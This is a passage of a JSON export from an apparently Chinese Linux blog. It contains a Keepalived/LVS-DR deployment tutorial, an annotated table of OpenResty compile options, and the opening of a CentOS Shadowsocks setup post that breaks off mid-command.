修改完成后，重新刷新页面，中文显示就正常了。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"http://blog.unixmen.cn/categories/Linux/Zabbix/"}],"tags":[{"name":"zabbix3.0","slug":"zabbix3-0","permalink":"http://blog.unixmen.cn/tags/zabbix3-0/"},{"name":"监控平台","slug":"监控平台","permalink":"http://blog.unixmen.cn/tags/监控平台/"}]},{"title":"Keepalived部署","slug":"keepalived部署","date":"2016-12-09T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/12/10/keepalived部署/","link":"","permalink":"http://blog.unixmen.cn/2016/12/10/keepalived部署/","excerpt":"1. Director Server配置安装软件依赖环境12# yum install -y gcc*# yum install -y openssl*\n安装ipvsadm1# yum install -y ipvsadm\n下载软件安装包并解压12# wget http://www.keepalived.org/software/keepalived-1.3.2.tar.gz# tar zxf keepalived-1.3.2.tar.gz\n为程序准备安装目录12# mkdir /usr/local/keepalived# mkdir /etc/keepalived","text":"1. Director Server配置安装软件依赖环境12# yum install -y gcc*# yum install -y openssl* 安装ipvsadm1# yum install -y ipvsadm 下载软件安装包并解压12# wget http://www.keepalived.org/software/keepalived-1.3.2.tar.gz# tar zxf keepalived-1.3.2.tar.gz 为程序准备安装目录12# mkdir /usr/local/keepalived# mkdir /etc/keepalived 编译前配置12# cd keepalived-1.3.2# ./configure --prefix=/usr/local/keepalived/ 编译安装1# make &amp;&amp; make install 为keepalived准备启动脚本和配置文件1234# cd /usr/local/keepalived/# cp /usr/local/keepalived/sbin/keepalived /usr/sbin/# cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/# cp /root/soft/keepalived-1.3.2/keepalived/etc/init.d/keepalived /etc/init.d/ 将keepalived加入开机启动项123# chmod +x /etc/init.d/keepalived# chkconfig --add keepalived# chkconfig keepalived on 在MASTER服务器上按需修改keepalived.conf配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# vim /etc/keepalived/keepalived.conf! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; wanglei@kuparts.com &#125; notification_email_from admin@test.com smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id LVS_MASTER vrrp_skip_check_adv_addr vrrp_strict vrrp_garp_interval 0 vrrp_gna_interval 0&#125;## for Nginx vrrp 实例配置vrrp_instance VI_nginx &#123; state MASTER interface em1 # 此处interface名称一定要跟服务器上实际的网卡名称一致，否则keepalived服务会启动失败。 virtual_router_id 61 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 123456 &#125; virtual_ipaddress &#123; 121.201.40.140 &#125;&#125;## for Nginx real_server相关配置virtual_server 121.201.40.140 80 &#123; delay_loop 6 lb_algo rr lb_kind DR nat_mask 255.255.255.0 persistence_timeout 50 protocol TCP real_server 192.168.1.9 80 &#123; weight 1 TCP_CHECK &#123; connect_timeout 3 nb_get_retry 3 delay_before_retry 3 &#125; &#125; real_server 192.168.1.10 80 &#123; weight 1 TCP_CHECK &#123; connect_timeout 3 nb_get_retry 3 delay_before_retry 3 &#125; &#125;&#125; 将MASTER上的配置同步到BACKUP服务器并相应修改1# scp -P 16804 /etc/keepalived/keepalived.conf root@kp-bt-04:/etc/keepalived/ 配置iptables规则1234# iptables -I INPUT -d 224.0.0.0/8 -j ACCEPT# iptables -I INPUT -p vrrp -j ACCEPT# iptables -I INPUT -p tcp --dport 80 -j ACCEPT# service iptables save 启动keepalived服务1# service keepalived start 2. Realserver配置创建一个脚本配置arp抑制及绑定vip1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# vim /home/vip-add.sh#!/bin/bash # # Script to start LVS DR real server. # description: LVS DR real server # . /etc/rc.d/init.d/functionsVIP=x.x.x.x #这里根据需要改成自己的VIP地址host=`/bin/hostname`case &quot;$1&quot; in start) # Start LVS-DR real server on this machine. /sbin/ifconfig lo down /sbin/ifconfig lo up echo 1 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 2 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce /sbin/ifconfig lo:0 $VIP broadcast $VIP netmask 255.255.255.255 up /sbin/route add -host $VIP dev lo:0;; stop) # Stop LVS-DR real server loopback device(s). /sbin/ifconfig lo:0 down echo 0 &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore echo 0 &gt; /proc/sys/net/ipv4/conf/lo/arp_announce echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_announce;; status) # Status of LVS-DR real server. islothere=`/sbin/ifconfig lo:0 | grep $VIP` isrothere=`netstat -rn | grep &quot;lo:0&quot; | grep $VIP` if [ ! &quot;$islothere&quot; -o ! &quot;isrothere&quot; ];then # Either the route or the lo:0 device # not found. echo &quot;LVS-DR real server Stopped.&quot; else echo &quot;LVS-DR real server Running.&quot; fi ;; *) # Invalid entry. echo &quot;$0: Usage: $0 &#123;start|status|stop&#125;&quot; exit 1 ;; esac该脚本来源：http://lovelace.blog.51cto.com/1028430/1550188 启动该脚本12# chmod +x vip-add.sh# ./vip-add.sh start 测试访问正常。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"keepalived","slug":"Linux/keepalived","permalink":"http://blog.unixmen.cn/categories/Linux/keepalived/"}],"tags":[{"name":"keepalived","slug":"keepalived","permalink":"http://blog.unixmen.cn/tags/keepalived/"}]},{"title":"Openresty编译参数详解","slug":"openresty+编译参数详解","date":"2016-11-30T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/12/01/openresty+编译参数详解/","link":"","permalink":"http://blog.unixmen.cn/2016/12/01/openresty+编译参数详解/","excerpt":"表格太长，请直接点击查看全文。","text":"表格太长，请直接点击查看全文。 参数选项 说明 –help this message 帮助选项 –prefix=PATH set the installation prefix (default to /usr/local/openresty) 设置安装路径 –with-debug enable debug logging 启用调试日志 –with-dtrace-probes enable dtrace USDT probes 启用DTrace USDT探针 （DTrace 提供丰富的用于监视系统各方面（从内核直到应用程序）运行情况的探测。我们可以在不修改应用程序的情况下执行很多检查，但是要想获得详细的统计数据，就需要在应用程序中添加探测。USDT 让开发人员可以在代码中重要的位置添加特定的探测。还可以使用 USDT 从正在运行的应用程序获取数据，这些数据可作为跟踪应用程序的探测的参数而被访问。） –with-dtrace=PATH set dtrace utility pathname 设置DTrace路径 –with-no-pool-patch enable the no-pool patch for debugging memory issues 启用无池补丁调试内存问题 （nginx的内存池可能会干扰nginx发现内存问题的第一现场，所以可以考虑在构造openresty时禁用nginx 的内存池，即使用 –with-no-pool-patch 选项） -jN pass -jN option to make while building the bundled Lua 5.1 interpreter or LuaJIT 2.1 pass -jN选项，在构建捆绑的Lua 5.1解释器或LuaJIT 2.1时 –without-http_echo_module disable ngx_http_echo_module 禁用ngx_http_echo_module （nginx的echo模块可以在nginx的url访问中通过echo命令输出字符到用户的浏览器，一般用来调试输出信息，检测nginx的可访问性、配置正确性。） –without-http_xss_module disable ngx_http_xss_module 禁用ngx_http_xss_module 跨站点脚本支持 –without-http_coolkit_module disable ngx_http_coolkit_module 禁用ngx_http_coolkit_module （ngx_http_coolkit_module是一个小而有用的nginx插件模块集合） –without-http_set_misc_module disable ngx_http_set_misc_module 禁用ngx_http_set_misc_module （ngx_http_set_misc_module模块是标准的HttpRewriteModule指令的扩展，提供更多的功能，如URI转义与非转义、JSON引述、Hexadecimal/MD5/SHA1/Base32/Base64编码与解码、随机数等等。） –without-http_form_input_module disable ngx_http_form_input_module 禁用ngx_http_form_input_module （ngx_http_form_input_module是 Openresty 中一个用于处理 HTTP 请求的 POST 以及 PUT 方法，在协议头 Content-Type 是 application/x-www-form-urlencoded 的情况下，解析请求实体内容并按 nginx 变量存储的模块。） –without-http_encrypted_session_module disable ngx_http_encrypted_session_module 禁用ngx_http_encrypted_session_module （ngx_http_encrypted_session_module是一个加密解密nginx变量值的模块，此模块提供了基于AES-256与Mac的变量加密和解密支持，此模块通常与ngx_set_misc模块和标准rewrite模块的指令一起使用，此模块可用于实现简单的用户登录和ACL。） –without-http_srcache_module disable ngx_http_srcache_module 禁用ngx_http_srcache_module （此模块为任意nginx位置提供了一个透明缓存层，为location增加了透明的基于subrequest的缓存层（类似于使用upstream或者甚至提供静态磁盘文件的缓存层）。） –without-http_lua_module disable ngx_http_lua_module 禁用ngx_http_lua_module –without-http_lua_upstream_module disable ngx_http_lua_upstream_module 禁用ngx_http_lua_upstream_module （ngx_http_lua_upstream_module是openresty的负载均衡模块） –without-http_headers_more_module disable ngx_http_headers_more_module 禁用ngx_http_headers_more_module （ngx_http_headers_more_module是nginx定制header返回信息模块，用于添加、设置和清除输入和输出的头信息。nginx源码没有包含该模块，需要另行添加。该模块是ngx_http_headers_module模块的增强版，提供了更多的实用工具，比如复位或清除内置头信息，如Content-Type, Content-Length, 和Server。可以允许你使用-s选项指定HTTP状态码，使用-t选项指定内容类型，通过more_set_headers 和 more_clear_headers 指令来修改输出头信息。） –without-http_array_var_module disable ngx_http_array_var_module 禁用ngx_http_array_var_module （此模块为nginx.conf提供了数组类型的nginx变量。） –without-http_memc_module disable ngx_http_memc_module 禁用ngx_http_memc_module （memc模块扩展了Nginx标准的memcache模块，增加了set、add、delete等memcache命令） –without-http_redis2_module disable ngx_http_redis2_module 禁用ngx_http_redis2_module （redis2-nginx-module 是一个支持 Redis 2.0 协议的 Nginx upstream 模块，它可以让 Nginx 以非阻塞方式直接防问远方的 Redis 服务，同时支持 TCP 协议和 Unix Domain Socket 模式，并且可以启用强大的 Redis 连接池功能。） –without-http_redis_module disable ngx_http_redis_module 禁用ngx_http_redis_module （此模块是一个简单的提供redis缓存的模块，目前仅提供select和get方法。） –without-http_rds_json_module disable ngx_http_rds_json_module 禁用ngx_http_rds_json_module （此模块用来做数据格式转换） –without-http_rds_csv_module disable ngx_http_rds_csv_module 禁用ngx_http_rds_csv_module （此模块用来做数据格式转换） –without-ngx_devel_kit_module disable ngx_devel_kit_module 禁用ngx_devel_kit_module （Nginx的开发套件） –without-http_ssl_module disable ngx_http_ssl_module 禁用ngx_http_ssl_module （该模块使Nginx支持SSL协议，提供HTTPS服务。该模块的安装依赖于OpenSSL。） –with-http_iconv_module enable ngx_http_iconv_module 启用ngx_http_iconv_module （此模块使用libiconv来转换不同编码字符，依赖于libiconv。） –with-http_drizzle_module enable ngx_http_drizzle_module 启用ngx_http_drizzle_module （此模块使NGINX直接与MySQL或Drizzle（一个精简版的MySQL分支）数据库服务器通信） –with-http_postgres_module enable ngx_http_postgres_module 启用ngx_http_postgres_module （此模块允许NGINX直接与PostgreSQL数据库通信） –without-lua_cjson disable the lua-cjson library 禁用lua-cjson library （Lua CJSON是一个Lua c模块，提供快速的JSON解析和Lua的编码支持） –without-lua_redis_parser disable the lua-redis-parser library 禁用lua-redis-parser library （lua-redis解析器库实现了一个简单且快速的redis原始响应解析器，它构造相应的lua数据结构，以及一个构造redis raw请求的函数。） –without-lua_rds_parser disable the lua-rds-parser library 禁用lua-rds-parser library （这个Lua库可以用于将Drizzle Nginx模块和Postgres Nginx模块生成的Resty-DBD-Stream格式的数据解析为Lua数据结构。在过去，我们必须使用JSON作为中间数据格式，这在内存和CPU时间方面是相当低效的。为了最大化速度和最小化内存占用，这个库以纯C语言实现。默认情况下启用此库。） –without-lua_resty_dns disable the lua-resty-dns library 禁用lua-resty-dns library （非阻塞DNS（域名系统）解析器的Lua Nginx模块，基于cosocket API。） –without-lua_resty_memcached disable the lua-resty-memcached library 禁用lua-resty-memcached library （Memcached客户端驱动程序模块，基于cosocket API的Lua Nginx模块。） –without-lua_resty_redis disable the lua-resty-redis library 禁用lua-resty-redis library （Lua Redis客户端驱动程序，基于cosocket API的Lua Nginx模块。） –without-lua_resty_mysql disable the lua-resty-mysql library 禁用lua-resty-mysql library （Lua MySQL客户端驱动程序，基于cosocket API的Lua Nginx模块。） –without-lua_resty_upload disable the lua-resty-upload library 禁用lua-resty-upload library （基于Lua Nginx模块的cosocket API用于HTTP文件上传流阅读器和分析器。） –without-lua_resty_upstream_healthcheck disable the lua-resty-upstream-healthcheck library 禁用lua-resty-upstream-healthcheck library （此模块是纯Lua的Nginx上游服务器健康检查器。） –without-lua_resty_string disable the lua-resty-string library 禁用lua-resty-string library （一个Lua库，为Lua Nginx模块提供字符串实用程序和通用哈希函数。） –without-lua_resty_websocket disable the lua-resty-websocket library 禁用lua-resty-websocket library （这个Lua库实现了一个非阻塞WebSocket服务器和基于Lua Nginx模块的cosocket API的非阻塞WebSocket客户端。） –without-lua_resty_lock disable the lua-resty-lock library 禁用lua-resty-lock library （这个Lua库实现了一个基于Lua Nginx模块的共享内存字典的简单非阻塞互斥锁API。 主要用于消除“dog-pile effects”。dog-pile effect 指当网页缓存失效同时遇到大量请求，后端应用服务请求建立缓存，导致服务器卡顿甚至系统宕机的现象。） –without-lua_resty_lrucache disable the lua-resty-lrucache library 禁用lua-resty-lrucache library （实现OpenResty的Lua-land LRU缓存。） –without-lua_resty_core disable the lua-resty-core library 禁用lua-resty-core library （使用LuaJIT FFI实现Lua Nginx模块提供的Lua API。） –with-lua51 enable and build the bundled standard Lua 5.1 interpreter 启用并构建捆绑的标准Lua 5.1解释器 –without-lua51 disable the bundled standard Lua 5.1 interpreter 禁用捆绑的标准Lua 5.1解释器 –with-lua51=DIR specify the external installation of Lua 5.1 by DIR 指定由外部DIR安装Lua 5.1 –with-luajit enable and build the bundled LuaJIT 2.1 (the default) 启用并构建捆绑的LuaJIT 2.1（默认） –with-luajit=DIR use the external LuaJIT 2.1 installation specified by DIR 使用指定的DIR安装LuaJIT 2.1 –with-luajit-xcflags=FLAGS Specify extra C compiler flags for LuaJIT 2.1 为LuaJIT 2.1指定额外的C编译器标志 –with-libdrizzle=DIR specify the libdrizzle 1.0 (or drizzle) installation prefix 指定libdrizzle 1.0（或drizzle）安装路径 –with-libpq=DIR specify the libpq (or postgresql) installation prefix 指定libpq（或postgresql）安装路径 –with-pg_config=PATH specify the path of the pg_config utility 指定pg_config实用程序的路径 Options directly inherited from nginx 直接继承自nginx的选项 –sbin-path=PATH set nginx binary pathname 设置可执行文件放置路径 –conf-path=PATH set nginx.conf pathname 设置配置文件的放置路径 –error-log-path=PATH set error log pathname 设置error日志文件的放置路径 –pid-path=PATH set nginx.pid pathname 设置pid文件的放置路径 –lock-path=PATH set nginx.lock pathname 设置lock文件的放置路径 –tapset-prefix=PATH set systemtap tapset directory prefix 设置systemtap tapset目录路径 –stap-nginx-path=PATH set stap-nginx pathname 设置stap-nginx路径名 –user=USER set non-privileged user for worker processes 为工作进程设置非特权用户 –group=GROUP set non-privileged group for worker processes 为工作进程设置非特权组 –builddir=DIR set the build directory 设置构建目录 –with-select_module enable select module 使用select module处理事件驱动 –without-select_module disable select module 禁用select module –with-poll_module enable poll module 使用poll module处理事件驱动 –without-poll_module disable poll module 禁用poll module –with-threads enable thread pool support 启用线程池支持 –with-file-aio enable file aio support 启用文件异步IO支持 –with-ipv6 enable ipv6 support 启用ipv6支持 –with-http_realip_module enable ngx_http_realip_module 启用ngx_http_realip_module （该模块可以从客户端请求里的header信息（如X-Real-IP或者X-Forwared-For）中获取真正的客户端IP地址） –with-http_addition_module enable ngx_http_addition_module 启用http addition module。该模块可以再返回客户端的HTTP包体头部或者尾部增加内容 –with-http_xslt_module enable ngx_http_xslt_module 启用http xslt module。这个模块可以使XML格式的数据在发给客户端前加入XSL渲染，此模块依赖于libxml2和libxslt库。 –with-http_image_filter_module enable ngx_http_image_filter_module 启用http image filter module。此模块将符合配置的图片实时压缩为指定大小（width*height）的缩略图再发送给用户，目前支持JPEG、PNG、GIF格式。此模块依赖于开源的libgd库。 –with-http_geoip_module enable ngx_http_geoip_module 启用http geoip module。该模块可以依据MaxMind GeoIP的IP地址数据库对客户端的IP地址得到实际的地理位置信息。 –with-http_sub_module enable ngx_http_sub_module 启用http sub module。该模块可以在Nginx返回客户端的HTTP响应包中将指定的字符串替换为自己需要的字符串。例如，在HTML的返回中，将&lt;/head&gt;替换为&lt;/head&gt;&lt;script language=&quot;javascript&quot; src=&quot;$script&quot;&gt;&lt;/script&gt; –with-http_dav_module enable ngx_http_dav_module 启用http dav module。这个模块可以让Nginx支持Webdav标准，如支持Webdav协议中的PUT、DELETE、COPY、MOVE、MKCOL等请求 –with-http_flv_module enable ngx_http_flv_module 启用http flv module。这个模块可以在向客户端返回响应时，对FLV格式的视频文件在header头做一些处理，使得客户端可以观看、拖动FLV视频 –with-http_gzip_static_module enable ngx_http_gzip_static_module 启用http gzip static module。如果采用gzip模块把一些文档进行gzip格式压缩后再返回给客户端，那么对同一个文件每次都会重新压缩，这是比较消耗服务器CPU资源的。gzip static模块可以在做gzip压缩前，先查看相同位置是否有已经做过gzip压缩的.gz文件，如果有就直接返回。这样就可以预先在服务器上做好文档的压缩，给CPU减负。 –with-http_auth_request_module enable ngx_http_auth_request_module 启用http auth request module。这个是nginx的一个验证模块，这个模块允许您的nginx通过发送请求到后端服务器（一般是应用服务器，例如tomcat，或者php等）进行请求，并且根据请求决定是验证通过或者不通过。 –with-http_random_index_module enable ngx_http_random_index_module 启用http random index module。该模块在客户端访问某个目录时，随机返回该目录下的任意文件。 –with-http_secure_link_module enable ngx_http_secure_link_module 启用http secure link module。该模块提供一种验证请求是否有效的机制。例如，它会验证URL中需要加入的token参数是否属于特定客户端发来的，以及检查时间戳是否过期。 –with-http_degradation_module enable ngx_http_degradation_module 启用http degradation module。该模块针对一些特殊的系统调用（如sbrk）做一些优化，如直接返回HTTP响应码为204或444，目前不支持Linux系统。 –with-http_stub_status_module enable ngx_http_stub_status_module 启用http stub status module。该模块可以让运行中的Nginx提供性能统计页面，获取相关的并发连接、请求的信息。 –without-http_charset_module disable ngx_http_charset_module 禁用http charset module。这个模块可以将服务器发出的HTTP响应重编码。 –without-http_gzip_module disable ngx_http_gzip_module 禁用http gzip module。在服务器发出的HTTP响应包中，这个模块可以按照配置文件指定的content-type对特定大小的HTTP响应包体执行gzip压缩。 –without-http_ssi_module disable ngx_http_ssi_module 禁用http ssi module。该模块可以在向用户返回的HTTP响应包体中加入特定的内容，如HTML文件中固定的页头和页尾。 –without-http_userid_module disable ngx_http_userid_module 禁用http userid module。该模块可以通过HTTP请求头部信息里的一些字段认证用户信息，以确定请求是否合法。 –without-http_access_module disable ngx_http_access_module 禁用http access module。该模块可以根据IP地址限制能够访问服务器的客户端。 –without-http_auth_basic_module disable ngx_http_auth_basic_module 禁用http auth basic module。该模块可以提供最简单的用户名/密码认证。 –without-http_autoindex_module disable ngx_http_autoindex_module 禁用http autoindex module。该模块提供简单的目录浏览功能。 –without-http_geo_module disable ngx_http_geo_module 禁用http geo module。该模块可以定义一些变量，这些变量的值将与客户端IP地址关联，这样Nginx针对不同的地区的客户端（根据IP地址判断）返回不一样的结果，例如不同地区显示不同语言的网页。 –without-http_map_module disable ngx_http_map_module 禁用http map module。该模块可以建立一个key/value映射表，不同的key得到相应的value，这样可以针对不同的URL做特殊处理。例如，返回302重定向响应时，可以期望URL不同时返回的Location字段也不一样。 –without-http_split_clients_module disable ngx_http_split_clients_module 禁用http split clients module。该模块会根据客户端的信息，例如IP地址、header头、cookie等，来区分处理。 –without-http_referer_module disable ngx_http_referer_module 禁用http referer module。该模块可以根据请求中的refer字段来拒绝请求。 –without-http_rewrite_module disable ngx_http_rewrite_module 禁用http rewrite module。 该模块提供HTTP请求在Nginx服务内部的重定向功能，依赖PCRE库。 –without-http_proxy_module disable ngx_http_proxy_module 禁用http proxy module。 该模块提供基本的HTTP反向代理功能。 –without-http_fastcgi_module disable ngx_http_fastcgi_module 禁用http fastcgi module。 该模块提供FastCGI功能。 –without-http_uwsgi_module disable ngx_http_uwsgi_module 禁用http uwsgi module 该模块提供uWSGI功能。uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。 –without-http_scgi_module disable ngx_http_scgi_module 禁用http scgi module 该模块提供SCGI功能。SCGI(Simple Common Gateway Interface),简单通用网关接口。是CGI的替代协议，与FastCGI相似，但更简单。 –without-http_memcached_module disable ngx_http_memcached_module 禁用http memcached module。该模块可以使得Nginx直接由上游的memcached服务读取数据，并简单地适配成HTTP响应返回给客户端。 –without-http_limit_conn_module disable ngx_http_limit_conn_module 禁用http limit conn module。该模块针对某个IP地址限制并发连接数。 –without-http_limit_req_module disable ngx_http_limit_req_module 禁用http limit req module。该模块针对某个IP地址限制并发请求数。 –without-http_empty_gif_module disable ngx_http_empty_gif_module 禁用http empty gif module。该模块可以使得Nginx在收到无效请求时，立刻返回内存中的1×1像素的GIF图片。这种好处在于，对于明显的无效请求不会去试图浪费服务器资源。 –without-http_browser_module disable ngx_http_browser_module 禁用http browser module。该模块会根据HTTP请求中的user-agent字段（该字段通常由浏览器填写）来识别浏览器。 –without-http_upstream_ip_hash_module disable ngx_http_upstream_ip_hash_module 禁用http upstream ip hash module。该模块提供当Nginx与后端server建立连接时，会根据IP做散列运算来决定与后端哪台server通信，这样可以实现负载均衡。 –without-http_upstream_least_conn_module disable ngx_http_upstream_least_conn_module 禁用http upstream least conn module。该模块提供当Nginx与后端server建立连接时，会通过最少连接负载均衡算法来决定与后端哪台server通信，简单来说就是每次选择的都是当前最少连接的一个server(这个最少连接不是全局的，是每个进程都有自己的一个统计列表)。 –without-http_upstream_keepalive_module disable ngx_http_upstream_keepalive_module 禁用http upstream keepalive module。这是一个用于nginx的实现缓存的后端连接的keepalive平衡器模块。 –with-http_perl_module enable ngx_http_perl_module –with-perl_modules_path=PATH set path to the perl modules 设置perl module的路径，只有使用了第三方的perl module，才需要配置这个路径。 –with-perl=PATH set path to the perl binary 设置perl binary的路径。如果配置的Nginx会执行Perl脚本，那么就必须设置此路径。 –http-log-path=PATH set path to the http access log 设置access日志存放路径。 –http-client-body-temp-path=PATH set path to the http client request body temporary files 处理HTTP请求时如果请求的包体需要暂时存放到临时磁盘文件中，则把这样的临时文件存放到该路径下。 –http-proxy-temp-path=PATH set path to the http proxy temporary files Nginx作为HTTP反向代理服务器时，上游服务器产生的HTTP包体在需要临时存放到磁盘文件时，这样的临时文件将存放到该路径下。 –http-fastcgi-temp-path=PATH set path to the http fastcgi temporary files 设置Fastcgi所使用临时文件的存放路径。 –http-uwsgi-temp-path=PATH set path to the http uwsgi temporary files 设置uWSGI所使用临时文件的存放路径。 –http-scgi-temp-path=PATH set path to the http scgi temporary files 设置SCGI所使用临时文件的存放路径。 –without-http disable HTTP server 禁用HTTP服务器。 –without-http-cache disable HTTP cache 禁用HTTP服务器里的缓存Cache特性。 –with-mail enable POP3/IMAP4/SMTP proxy module 安装邮件服务器反向代理模块，使Nginx可以反向代理IMAP、POP3、SMTP等协议，该模块默认不安装。 –with-mail_ssl_module enable ngx_mail_ssl_module 安装mail ssl module。该模块可以使IMAP、POP3、SMTP等协议基于SSL/TLS协议之上使用。该模块默认不安装并依赖于OpenSSL库。 –without-mail_pop3_module disable ngx_mail_pop3_module 不安装mail pop3 module。在使用–with-mail参数后，pop3 module是默认安装的，以使Nginx支持POP3协议。 –without-mail_imap_module disable ngx_mail_imap_module 不安装mail imap module。在使用–with-mail参数后，imap module是默认安装的，以使Nginx支持IMAP协议。 –without-mail_smtp_module disable ngx_mail_smtp_module 不安装smtp pop3 module。在使用–with-mail参数后，smtp module是默认安装的，以使Nginx支持SMTP协议。 –with-google_perftools_module enable ngx_google_perftools_module 启用google perftools module。该模块提供Google的性能测试工具。 –with-cpp_test_module enable ngx_cpp_test_module 启用cpp测试模块 –add-module=PATH enable an external module 当在Nginx里加入第三方模块时，通过这个参数指定第三方模块的路径。 –with-cc=PATH set path to C compiler 设置C编译器的路径 –with-cpp=PATH set path to C preprocessor 设置C预编译器的路径 –with-cc-opt=OPTIONS set additional options for C compiler 如果希望在Nginx编译期间指定加入一些编译选项，如指定宏或者使用-I加入某些需要包含的目录，这时可以使用该参数达成目的 –with-ld-opt=OPTIONS set additional options for linker 最终的二进制可执行文件是由编译后生成的目标文件与一些第三方库链接生成的，在执行链接操作时可能会需要指定链接参数，–with-ld-opt就是用于加入链接时的参数。例如，如果我们希望将某个库链接到Nginx程序中，需要在这里加入–with-ld-opt=libraryName -LibraryPath，其中libraryName是目标库的名称，LibraryPath则是目标库所在的路径 –with-cpu-opt=CPU build for specified CPU, the valid values: pentium, pentiumpro, pentium3, pentium4, athlon, opteron, sparc32, sparc64, ppc64 指定CPU处理器架构，只能从以下取值中选择：pentium, pentiumpro, pentium3, pentium4, athlon, opteron, sparc32, sparc64, ppc64 –with-make=PATH specify the default make utility to be used 指定要使用的默认make实用程序 –without-pcre disable PCRE library usage 如果确认Nginx不用解析正则表达式，也就是说，nginx.conf配置文件中不会出现正则表达式，那么可以使用这个参数 –with-pcre force PCRE library usage 强制使用PCRE库 –with-pcre=DIR set path to PCRE library sources 指定PCRE库的源码位置，在编译时会进入该目录编译PCRE源码 –with-pcre-opt=OPTIONS set additional make options for PCRE 编译PCRE源码时希望加入的编译选项 –with-pcre-conf-opt=OPTIONS set additional configure options for PCRE 设置PCRE的其他配置选项 –with-pcre-jit build PCRE with JIT compilation support 使用JIT编译支持构建PCRE –with-md5=DIR set path to md5 library sources 指定MD5库的源码位置，在编译Nginx时会进入该目录编译MD5源码。注意：Nginx源码中已经有了MD5算法的实现，如果没有特殊需求，那么完全可以使用Nginx自身实现的MD5算法 –with-md5-opt=OPTIONS set additional options for md5 building 编译MD5源码时希望加入的编译选项 –with-md5-asm use md5 assembler sources 使用MD5的汇编源码 –with-sha1=DIR set path to sha1 library sources 指定SHA1库的源码位置，在编译Nginx时会进入该目录编译SHA1源码。注意：OpenSSL中已经有了SHA1算法的实现，如果已经安装了OpenSSL，那么完全可以使用OpenSSL实现的SHA1算法 –with-sha1-opt=OPTIONS set additional options for sha1 building 编译SHA1源码时希望加入的编译选项 –with-sha1-asm use sha1 assembler sources 使用SHA1的汇编源码 –with-zlib=DIR set path to zlib library sources 指定zlib库的源码位置，在编译Nginx时会进入该目录编译zlib源码。如果使用了gzip压缩功能，就需要zlib库的支持 –with-zlib-opt=OPTIONS set additional options for zlib building 编译zlib源码时希望加入的编译选项 –with-zlib-asm=CPU use zlib assembler sources optimized for specified CPU, the valid values:pentium, pentiumpro 指定对特定的CPU使用zlib库的汇编优化功能，目前仅支持两种架构：pentium和pentiumpro –with-libatomic force libatomic_ops library usage 强制使用atomic库。atomic库是CPU架构独立的一种原子操作的实现。它支持以下体系架构：x86（包括i386和x86_64）、PPC64、Sparc64（v9或更高版本）或者安装了GCC4.1.0及更高版本的架构。 –with-libatomic=DIR set path to libatomic_ops library sources atomic库所在的位置 –with-openssl=DIR set path to OpenSSL library sources 指定OpenSSL库的源码位置，在编译Nginx时会进入该目录编译OpenSSL源码。 注意：如果Web服务器支持HTTPS，也就是SSL协议，Nginx要求必须使用OpenSSL。可以访问http://www.openssl.org/免费下载 –with-openssl-opt=OPTIONS set additional options for OpenSSL building 编译OpenSSL源码时希望加入的编译选项 –dry-run dry running the configure, for testing only 仅测试配置 –platform=PLATFORM forcibly specify a platform name, for testing only 强制指定平台名称，仅用于测试","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Nginx/OpenResty","slug":"Linux/Nginx-OpenResty","permalink":"http://blog.unixmen.cn/categories/Linux/Nginx-OpenResty/"}],"tags":[{"name":"openresty","slug":"openresty","permalink":"http://blog.unixmen.cn/tags/openresty/"},{"name":"编译参数","slug":"编译参数","permalink":"http://blog.unixmen.cn/tags/编译参数/"}]},{"title":"Centos环境搭建shadowsocks科学上网","slug":"Centos+shadowsocks","date":"2016-10-11T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/10/12/Centos+shadowsocks/","link":"","permalink":"http://blog.unixmen.cn/2016/10/12/Centos+shadowsocks/","excerpt":"\n前言：作为一名IT技术狗，在日常工作学习中，难免会经常使用搜索引擎来搜索技术问题，而众所周知的是百度在技术搜索上就是个笑话，想要快速找到答案还是得靠Google，但是因为某些不可描述的原因，在国内想通过正规途径来访问Google完全是不可能的。那么问题来了，如何通过一些技术小手段来正常访问Google呢？一般来说，常见的方法是通过国外线路的VPN来访问，然而这种情况下有一些使用上的不便。比如说：很多时候在解决问题的时候我们会有这样的需求，一边使用VPN线路通过Google来搜索技术问题同时还需要通过QQ等即时通信软件与同事朋友交流沟通，此时因为我们通过VPN线路来上网，那么就会出现QQ异地登录警告，严重时腾讯会直接将QQ冻结。所以，对于日常工作来说，我认为VPN太重，我们需要一个轻量级的工具仅需能够代理浏览器的请求即可，那么这时shadowsocks就是最好的选择了。\n\n1.安装python-pipPip是安装Python包的工具，提供了安装、列举已安装包、升级以及卸载包的功能。Pip 是对easy_install的取代，提供了和easy_install相同的查找包的功能，因此可以使用easy_install安装的包也同样可以使用pip进行安装。目前有很多Python程序都是可以直接通过Pip来一键安装了，比如众所周知的Django、Markdown、Shadowsocks等。1# yum install -y 